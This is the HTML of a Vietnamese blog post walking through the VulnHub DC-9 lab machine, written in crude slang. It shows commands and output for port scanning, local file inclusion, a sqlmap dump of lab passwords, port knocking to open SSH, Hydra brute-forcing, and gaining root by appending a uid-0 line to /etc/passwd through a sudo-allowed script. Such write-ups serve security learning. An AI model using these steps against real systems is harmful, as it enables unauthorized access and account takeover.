@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="OverviewLink download: DC: 9Difficulty: Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] DC-9">
+<meta property="og:url" content="http://example.com/2021/02/03/dc9-vulnhub/index.html">
+<meta property="og:site_name" content="TARS">
+<meta property="og:description" content="OverviewLink download: DC: 9Difficulty: Easy">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/1.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/2.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/3.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/4.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/5.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/6.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/7.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/8.png">
+<meta property="og:image" content="http://example.com/2021/02/03/dc9-vulnhub/9.png">
+<meta property="article:published_time" content="2021-02-03T03:23:56.000Z">
+<meta property="article:modified_time" content="2021-02-04T16:55:12.620Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/02/03/dc9-vulnhub/1.png">
+
+
+<link rel="canonical" href="http://example.com/2021/02/03/dc9-vulnhub/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<title>[VulnHub] DC-9 | TARS</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-188223675"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-188223675');
+      }
+    </script>
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">TARS</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"><i>"Everybody good? Plenty of slaves for my robot colony?"</i></p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploition"><span class="nav-number">3.</span> <span class="nav-text">Exploition</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">3.1.</span> <span class="nav-text">Sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Burp-suite"><span class="nav-number">3.2.</span> <span class="nav-text">Burp suite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hydra"><span class="nav-number">3.3.</span> <span class="nav-text">Hydra</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">4.</span> <span class="nav-text">Privileges Escalation</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description">#####</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/minhnq22" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/03/dc9-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+      <meta itemprop="description" content="#####">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TARS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] DC-9
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-03 10:23:56" itemprop="dateCreated datePublished" datetime="2021-02-03T10:23:56+07:00">2021-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>8 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a><br>Difficulty: Easy</p>
+<a id="more"></a>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nmap -sn 10.10.10.102-105 
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:22 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00028s latency).
+Nmap done: 4 IP addresses (1 host up) scanned in 1.26 seconds
+
+$ nmap -p- 10.10.10.104 --min-rate 3000
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:24 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00015s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80&#x2F;tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
+
+$ nmap -A 10.10.10.104 -p 80           
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:25 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00053s latency).
+
+PORT   STATE SERVICE VERSION
+80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache&#x2F;2.4.38 (Debian)
+|_http-title: Example.com - Staff Details - Welcome
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Hmm… bủn xỉn vcl, mở mỗi cổng 80-HTTP.<br><img src="1.png"><br><img src="2.png"><br>Từ từ đã, tại sao lại có dòng <em>File does not exist</em> ở kia? Tôi link ngay đến một bài CTF từng làm, truyền vào đây thêm một param nữa để gọi file. Đại khái là thằng manager.php đang gọi đến một hàm mở file và cần một param truyền vào (có thể là <em>file</em>, <em>f</em> hoặc gì gì…), nghe vô lý nhưng cái CTF style nó thế, chả đâu vào đâu :/<br><img src="3.png"><br>Chốt lại là web server dính lỗi LFI, lấy được mã nguồn trang, các thứ các thứ, nhưng chưa có thông tin nào cần để lấy được shell.<br>Quay lại với search.php, kiểm tra xem nó có dính SQL Injection hay không.<br><img src="4.png"><br>Okay… vậy là có SQL Injection luôn. Ném nó vào Sqlmap dump dữ liệu ra xem có gì hay ho…</p>
+<h2 id="Exploition"><a href="#Exploition" class="headerlink" title="Exploition"></a>Exploition</h2><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Database: Staff
+Table: Users
+[1 entry]
++--------+----------------------------------+----------+
+| UserID | Password                         | Username |
++--------+----------------------------------+----------+
+| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
++--------+----------------------------------+----------+
+
+Database: users
+Table: UserDetails
+[17 entries]
++----+------------+---------------+---------------------+-----------+-----------+
+| id | lastname   | password      | reg_date            | username  | firstname |
++----+------------+---------------+---------------------+-----------+-----------+
+| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
+| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
+| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
+| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
+| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
+| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
+| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
+| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
+| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
+| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
+| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
+| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
+| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
+| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
+| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
+| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
+| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
++----+------------+---------------+---------------------+-----------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Với mật khẩu hash của admin, đem crack chùa lấy được password ngon lành.<br>Thề, CrackStation với HashKiller lợi hại vãi cả đái.<br><img src="5.png"><br>Sau đó tôi có cố thử lợi dụng SQL Injection để up shell, chèn mã vào khắp nơi trên cái web site này. Sau 30 phút đéo đem lại gì ngoài sự chán nản. Đù, chả nhẽ nó khó đến thế à?<br><em>Và thế là tôi nén mở write up lên để xem xem bước tiếp theo họ làm như thế nào.<br>Cái mảng kiến thức này thực sự trước giờ tôi đéo biết :D</em><br>Như này…</p>
+<h3 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h3><p>Lần này quay lại với lỗi LFI ở trên đã phát hiện được, bây giờ tôi muốn fuzzing những file ở trong thư mục /etc để tìm kiếm thêm những cấu hình bên trong máy chủ này.<br><img src="6.png"><br><img src="7.png"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[options]
+	UseSyslog
+
+[openSSH]
+	sequence    &#x3D; 7469,8475,9842
+	seq_timeout &#x3D; 25
+	command     &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    &#x3D; syn
+
+[closeSSH]
+	sequence    &#x3D; 9842,8475,7469
+	seq_timeout &#x3D; 25
+	command     &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    &#x3D; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Google về thằng klockd này xem nó là thằng ml nào.</p>
+<blockquote>
+<p>knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
+</blockquote>
+<p>Nói qua một chút cho dễ hiểu, giống như trò gõ cửa mà hồi bé hay chơi, gõ cửa 4 lần thì người ở trong mới mở cửa, còn nếu gõ sai, có nghĩa người bên ngoài là người lạ, thì người bên trong sẽ không mở cửa.<br>Thằng ml Knockd này như kiểu là một thằng rảnh háng đứng ở tầng liên kết (trong mô hình OSI). Nó lắng nghe toàn bộ lưu lượng truy cập và khi nó nghe được một chuỗi <em>knock knock</em> giống như mật khẩu gõ cửa, nó sẽ chạy lệnh được xác định trong tệp cấu hình.<br>Phân tích tệp cấu hình knockd.conf. Có thể thấy, Knockd đang muốn lắng nghe lần lượt các gói tin TCP syn ở các cổng theo thứ tự 7469, 8475, 9842 để thực hiện lệnh mở cổng 22-SSH. Đây là lí do tại sao Nmap không thể quét ra được cổng 22-SSH trên máy chủ, vì nso có mở đéo đâu mà quét được.<br>Lúc này <em>knock knock knock</em> để mở cổng 22-SSH thôi nào :D</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ knock 10.10.10.104 7469 8475 9842
+
+$ nmap -p- 10.10.10.104
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 22:55 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.0038s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22&#x2F;tcp open  ssh
+80&#x2F;tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Good! Cái này trước đây tôi đéo biết, vậy nên làm bài này khiến tôi có thêm một kiến thức mới, không hề tệ với một bài lab easy.<br>Có SSH rồi, giờ brute-force thôi. Tại sao lại là brute-force? Vì ở kia tôi đã lấy được danh sách người dùng trong hệ thống từ file /etc/passwd. Password thì lấy được từ Sqlmap ở trên, mặc dù nó chả liên quan cho lắm nhưng biết đâu có user nào đấy chủ quan đặt password trên web trùng với password trên server thì sao.</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p><em>Lần này screen-shot Terminal cho nó màu mè</em><br><img src="8.png"></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Với session của user janitor, có một cái file vớ vẩn như thế này.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">janitor@dc-9:~$ ls -al
+total 20
+drwxrwxrwx  5 janitor janitor 4096 Feb  4 21:54 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; &#x2F;dev&#x2F;null
+drwxr-xr-x  2 janitor janitor 4096 Feb  4 21:55 duma
+drwx------  3 janitor janitor 4096 Feb  4 21:55 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+
+janitor@dc-9:~$ cd .secrets-for-putin
+
+janitor@dc-9:~&#x2F;.secrets-for-putin$ ls -al
+total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwxrwxrwx 5 janitor janitor 4096 Feb  4 21:54 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+janitor@dc-9:~&#x2F;.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Hmm… lại có thểm một vài mật khẩu nữa, nối vào cuối file password.txt rồi gọi lại Hydra xem có lấy thêm được account nào trong hệ thống không.<br><img src="9.png"><br>He, có thêm của fredf.<br>Với mấy user tìm được bên trên thì đều không có tên trong danh sách khách mời của sudoers, mỗi fredf là có.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test
+fredf@dc-9:~$ &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test
+Usage: python test.py read append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Phần này tôi bỏ qua SUID, vì tìm rồi và chả có mẹ gì. Tập trung vào <em>/opt/devstuff/dist/test/test</em>. Tìm xem cái file <em>test.py</em> ở đâu và có nội dung gì.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ find &#x2F; -name &quot;test.py&quot; 2&gt;&#x2F;dev&#x2F;null
+&#x2F;opt&#x2F;devstuff&#x2F;test.py
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;setuptools&#x2F;command&#x2F;test.py
+
+fredf@dc-9:~$ ls -al &#x2F;opt&#x2F;devstuff&#x2F;test.py
+-rw-r--r-- 1 root root 257 Feb  5 00:25 &#x2F;opt&#x2F;devstuff&#x2F;test.py
+
+fredf@dc-9:~$ cat &#x2F;opt&#x2F;devstuff&#x2F;test.py
+#!&#x2F;usr&#x2F;bin&#x2F;python
+
+import sys
+
+if len (sys.argv) !&#x3D; 3 :
+    print (&quot;Usage: python test.py read append. Adudu&quot;)
+    sys.exit (1)
+
+else :
+    f &#x3D; open(sys.argv[1], &quot;r&quot;)
+    output &#x3D; (f.read())
+
+    f &#x3D; open(sys.argv[2], &quot;a&quot;)
+    f.write(output)
+    f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>File này chỉ có quyền đọc thôi, không có quyền sửa. Nhưng đọc nội dung xem nó làm cái gì.<br>Sau câu lệnh else, nó thực hiện đọc nội dung file <em>sys.argv[1]</em> và nối (appent) vào file <em>sys.argv[2]</em>, với quyền Root. ĐÙ!<br>Thế thì bây giờ tôi sẽ tự tạo một tài khoản bằng cách chèn thêm vào cuối file /etc/passwd với ID 0, vì trong Linux, user có ID 0 thì mặc định là Root.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ echo minhdeptraivcl:$(openssl passwd 00000):0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash &gt; duma.txt
+
+fredf@dc-9:~$ cat duma.txt 
+minhdeptraivcl:FLvn5eWX&#x2F;KeFQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+
+fredf@dc-9:~$ sudo &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test duma.txt &#x2F;etc&#x2F;passwd
+
+fredf@dc-9:~$ cat &#x2F;etc&#x2F;passwd
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+...
+janitor2:x:1017:1017:Scott Morrison:&#x2F;home&#x2F;janitor2:&#x2F;bin&#x2F;bash
+minhdeptraivcl:FLvn5eWX&#x2F;KeFQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+
+fredf@dc-9:~$ su minhdeptraivcl
+Password: 00000
+
+root@dc-9:&#x2F;home&#x2F;fredf# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Done, Ez!<br>Việc có quyền ghi file với quyền của Root giống như leo thang với các trình editer như Vim hay Nano vậy, có thể sửa đổi những file nhạy cảm như /etc/passwd, /etc/shadow và một loạt các file cấu hình quan trọng khác trong hệ thống của Linux.</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
+    </div>
+  </div>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/01/vulnos-vulnhub/" rel="prev" title="vulnos-vulnhub">
+                  <i class="fa fa-chevron-left"></i> vulnos-vulnhub
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/03/mrrobot-vulnhub/" rel="next" title="[VulnHub] Mr.Robot">
+                  [VulnHub] Mr.Robot <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
